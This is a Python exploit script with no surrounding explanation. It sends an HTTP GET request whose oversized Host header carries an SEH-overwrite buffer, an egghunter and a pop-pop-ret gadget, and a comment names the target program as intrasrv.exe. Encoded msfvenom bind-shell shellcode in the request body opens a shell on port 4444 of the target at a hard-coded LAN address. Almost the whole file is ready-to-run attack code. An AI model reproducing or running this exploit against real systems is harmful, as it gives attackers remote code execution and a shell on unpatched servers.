#!/usr/bin/python

import socket

import os

import sys



target="192.168.1.169"


#W00T

egghunter="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7" + "\x90"*94

nseh="\xEB\x80\x90\x90"#jmp back do egghunter

seh="\xdd\x97\x40\x00"  #0x004097dd, # pop eax # pop ebp # ret  - intrasrv.exe

crash = "\x90"*1427 + egghunter + nseh + seh + "\x90"*2439 #4000 bytes


#msfvenom -a x86 --platform Windows -p windows/shell_bind_tcp LHOST=192.168.1.179 LPORT=4444 -e x86/alpha_mixed -f c

shellcode = ("T00WT00W" +
"\x89\xe2\xdd\xc2\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x69\x6c\x4a\x48\x4c\x42\x55\x50\x35\x50\x67\x70\x51\x70\x6f"
"\x79\x78\x65\x66\x51\x79\x50\x70\x64\x6e\x6b\x46\x30\x54\x70"
"\x6e\x6b\x53\x62\x56\x6c\x6e\x6b\x73\x62\x77\x64\x6c\x4b\x52"
"\x52\x66\x48\x64\x4f\x38\x37\x33\x7a\x76\x46\x70\x31\x79\x6f"
"\x4e\x4c\x57\x4c\x63\x51\x61\x6c\x43\x32\x74\x6c\x65\x70\x6b"
"\x71\x7a\x6f\x54\x4d\x35\x51\x39\x57\x6b\x52\x49\x62\x76\x32"
"\x31\x47\x4c\x4b\x72\x72\x44\x50\x6e\x6b\x62\x6a\x45\x6c\x4c"
"\x4b\x32\x6c\x52\x31\x72\x58\x6b\x53\x31\x58\x66\x61\x6a\x71"
"\x53\x61\x6c\x4b\x76\x39\x51\x30\x53\x31\x49\x43\x4e\x6b\x42"
"\x69\x46\x78\x4b\x53\x57\x4a\x61\x59\x6c\x4b\x76\x54\x4e\x6b"
"\x67\x71\x49\x46\x75\x61\x49\x6f\x6c\x6c\x4f\x31\x5a\x6f\x56"
"\x6d\x36\x61\x7a\x67\x67\x48\x6d\x30\x33\x45\x4a\x56\x35\x53"
"\x73\x4d\x68\x78\x75\x6b\x73\x4d\x44\x64\x73\x45\x4a\x44\x52"
"\x78\x6c\x4b\x46\x38\x47\x54\x43\x31\x4a\x73\x53\x56\x6e\x6b"
"\x36\x6c\x70\x4b\x4c\x4b\x63\x68\x45\x4c\x36\x61\x7a\x73\x4c"
"\x4b\x55\x54\x4e\x6b\x55\x51\x68\x50\x4c\x49\x53\x74\x61\x34"
"\x57\x54\x53\x6b\x71\x4b\x61\x71\x66\x39\x50\x5a\x70\x51\x59"
"\x6f\x69\x70\x61\x4f\x71\x4f\x61\x4a\x4c\x4b\x36\x72\x4a\x4b"
"\x6e\x6d\x73\x6d\x71\x78\x36\x53\x65\x62\x53\x30\x63\x30\x33"
"\x58\x44\x37\x61\x63\x57\x42\x73\x6f\x50\x54\x43\x58\x50\x4c"
"\x32\x57\x61\x36\x37\x77\x39\x6f\x7a\x75\x4e\x58\x6e\x70\x73"
"\x31\x43\x30\x63\x30\x77\x59\x68\x44\x43\x64\x72\x70\x72\x48"
"\x57\x59\x4f\x70\x72\x4b\x57\x70\x49\x6f\x4a\x75\x61\x7a\x57"
"\x78\x52\x79\x32\x70\x39\x72\x69\x6d\x57\x30\x76\x30\x37\x30"
"\x46\x30\x53\x58\x5a\x4a\x76\x6f\x6b\x6f\x59\x70\x6b\x4f\x58"
"\x55\x4a\x37\x73\x58\x43\x32\x45\x50\x56\x71\x71\x4c\x4c\x49"
"\x6a\x46\x71\x7a\x62\x30\x43\x66\x43\x67\x73\x58\x38\x42\x6b"
"\x6b\x57\x47\x31\x77\x79\x6f\x78\x55\x50\x57\x50\x68\x48\x37"
"\x59\x79\x56\x58\x4b\x4f\x6b\x4f\x68\x55\x51\x47\x35\x38\x51"
"\x64\x48\x6c\x65\x6b\x6b\x51\x79\x6f\x58\x55\x46\x37\x5a\x37"
"\x62\x48\x64\x35\x70\x6e\x62\x6d\x75\x31\x79\x6f\x79\x45\x73"
"\x58\x43\x53\x42\x4d\x65\x34\x55\x50\x6b\x39\x4b\x53\x76\x37"
"\x76\x37\x42\x77\x56\x51\x7a\x56\x31\x7a\x57\x62\x43\x69\x71"
"\x46\x58\x62\x39\x6d\x53\x56\x4f\x37\x50\x44\x64\x64\x55\x6c"
"\x75\x51\x76\x61\x4c\x4d\x43\x74\x36\x44\x36\x70\x38\x46\x33"
"\x30\x53\x74\x63\x64\x56\x30\x56\x36\x76\x36\x53\x66\x42\x66"
"\x61\x46\x52\x6e\x70\x56\x62\x76\x53\x63\x51\x46\x45\x38\x63"
"\x49\x7a\x6c\x57\x4f\x4e\x66\x69\x6f\x7a\x75\x6b\x39\x6b\x50"
"\x50\x4e\x50\x56\x63\x76\x49\x6f\x64\x70\x35\x38\x65\x58\x4f"
"\x77\x67\x6d\x55\x30\x49\x6f\x69\x45\x4d\x6b\x78\x70\x38\x35"
"\x69\x32\x53\x66\x55\x38\x4e\x46\x5a\x35\x4f\x4d\x4d\x4d\x49"
"\x6f\x38\x55\x55\x6c\x33\x36\x51\x6c\x46\x6a\x6f\x70\x49\x6b"
"\x59\x70\x72\x55\x46\x65\x4f\x4b\x51\x57\x45\x43\x32\x52\x72"
"\x4f\x73\x5a\x57\x70\x61\x43\x39\x6f\x4a\x75\x41\x41")


buffer="GET / HTTP/1.1\r\n"

buffer+="Host: " + crash + "\r\n"

buffer+="Content-Type: application/x-www-form-urlencoded\r\n"

buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1)\r\n"

buffer+="Content-Length: 1048580\r\n\r\n"

buffer+=shellcode

one = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )

one.connect((target, 80))

one.send(buffer)

one.close()